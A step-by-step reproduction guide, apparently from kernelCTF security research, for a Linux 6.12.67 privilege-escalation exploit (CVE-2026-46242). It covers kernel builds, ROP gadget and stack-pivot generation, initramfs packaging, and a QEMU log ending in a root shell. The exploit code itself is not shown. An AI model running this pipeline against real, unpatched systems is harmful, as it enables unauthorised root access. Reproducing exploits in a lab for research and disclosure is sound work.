# Phase 2: Reproduction Audit

This document meticulously sequences the steps to fully recreate the environment, regenerate the database, and execute the exploit starting from a clean installation of a common Linux distribution (Fedora or Ubuntu/Debian).

## Step 1: Install System Dependencies
**For Fedora:**
```bash
sudo dnf install -y gcc g++ make git python3 python3-pip wget unzip curl bpftool dwarves cpio
```
**For Ubuntu/Debian:**
```bash
sudo apt update
sudo apt install -y build-essential git python3 python3-pip wget unzip curl linux-tools-common linux-tools-generic dwarves cpio
```

## Step 2: Install Python Packages & Tools
```bash
pip install --user angr angrop keystone-engine pyelftools capstone unicorn

# Install rp++
curl -LO https://github.com/0vercl0k/rp/releases/download/v2.1.5/rp-lin-gcc.zip
unzip rp-lin-gcc.zip -d ~/.local/bin/
mv ~/.local/bin/rp-lin ~/.local/bin/rp++
chmod +x ~/.local/bin/rp++
```

**CRITICAL FIX for Python 3.12+ (angrop Pickling Error):**
You must manually patch `angrop/rop_utils.py` located in your Python `site-packages` (e.g., `~/.local/lib/python3.X/site-packages/angrop/rop_utils.py`). Move the inner `class SpecialMem` from inside `make_initial_state` out to the global module level to prevent multiprocessing serialization crashes.

## Step 3: Kernel Acquisition & Compilation
```bash
git clone <repository_url> bad-epoll-lab
cd bad-epoll-lab/exploit/tier1-linux-vm

# Download Kernel Source
wget https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.12.67.tar.xz
tar -xf linux-6.12.67.tar.xz

# Configure Kernel
cd linux-6.12.67
make defconfig
# Enable required exploit-testing features in .config (e.g., DEBUG_INFO, BPF_SYSCALL, etc.)
# Highly recommended: copy the known-good config from the repository
cp ../.config .config 

# Compile Kernel (Adjust -j to your core count)
make -j$(nproc)
```

## Step 4: BusyBox & Initramfs Setup
*(Assuming BusyBox is statically compiled and placed in `rootfs_debug/bin/busybox`)*
```bash
cd ../rootfs_debug/bin
./busybox --install -s .
cd ../..
```

## Step 5: Database Regeneration
```bash
# Navigate to the generator
cd security-research/pocs/linux/kernelctf/CVE-2026-46242_lts_cos/exploit/lts-6.12.67/kernel-research

# Create Target Profile Path
mkdir -p image_db/releases/kernelctf/lts-6.12.67
cp ../../../../../../linux-6.12.67/vmlinux image_db/releases/kernelctf/lts-6.12.67/
cp ../../../../../../linux-6.12.67/arch/x86/boot/bzImage image_db/releases/kernelctf/lts-6.12.67/vmlinuz
echo "Linux version 6.12.67 (legion@fedora)" > image_db/releases/kernelctf/lts-6.12.67/version.txt

# Run Generator Pipeline
cd image_db/releases/kernelctf/lts-6.12.67
nm vmlinux > symbols.txt
pahole --btf_encode_detached btf vmlinux
bpftool btf dump -j file btf > btf.json
python3 ../../../extract_structures.py > structs.json
python3 ../../../kernel_pages.py vmlinux > kernel_pages.txt
python3 ../../../../rop_generator/angrop_rop_generator.py --output json --json-indent 4 vmlinux vmlinuz > rop_actions.json
python3 ../../../../rop_generator/pivot_finder.py --output json --json-indent 4 vmlinux vmlinuz > stack_pivots.json

# Compile Target DB
cd ../../../../kxdb_tool
./kxdb_tool.py --image-db-path ../image_db -o ../target_db.kxdb
```

## Step 6: Exploit Compilation & Packaging
```bash
cd ..  # Now in lts-6.12.67 exploit directory

# Build Exploit Binary
make

# Inject Exploit into Initramfs
rm -f ../../../../../../rootfs_debug/bin/exploit
cp exploit ../../../../../../rootfs_debug/bin/exploit
cd ../../../../../../rootfs_debug
find . -print0 | cpio --null -ov --format=newc > ../initramfs_exploit_debug.cpio
cd ..
```

## Step 7: Runtime Execution
```bash
# Launch VM
./start_qemu.sh
```

### Expected Output Log (`qemu_output.log`)
```
[env] cpu model: QEMU Virtual CPU version 2.5+
[+] target: kernelctf lts-6.12.67
[*] KASLR leak bypassed (nokaslr assumed).
[+] kernel_base=ffffffff81000000
[*] racing close-vs-close...
[+] race won: retries=1525 launch=4715 cc_retries=1
[*] cross-cache...
[+] cross-cache ok (init_task.comm=swapper)
[*] AAR: find task (comm=exploit)...
[+] task=ffff888003d98000
[*] RIP: fire f_op->poll hijack (virt=ffff888007428000)...
READY_FOR_GDB
Win! UID: 0, GID: 0, EUID: 0
uid=0(root) gid=0(root)
Linux (none) 6.12.67 #1 SMP PREEMPT_DYNAMIC Sun Jul 12 18:29:43 EDT 2026 x86_64 x86_64 x86_64 GNU/Linux
ROOT_SHELL_SUCCESS
[-] Segfault detected
[   11.191849] Kernel panic - not syncing: Attempted to kill init! exitcode=0x00000100
```
*(Note: the Segfault and Panic after `ROOT_SHELL_SUCCESS` are expected artifacts of running a non-interactive shell in QEMU, exiting PID 1 `/init`.)*
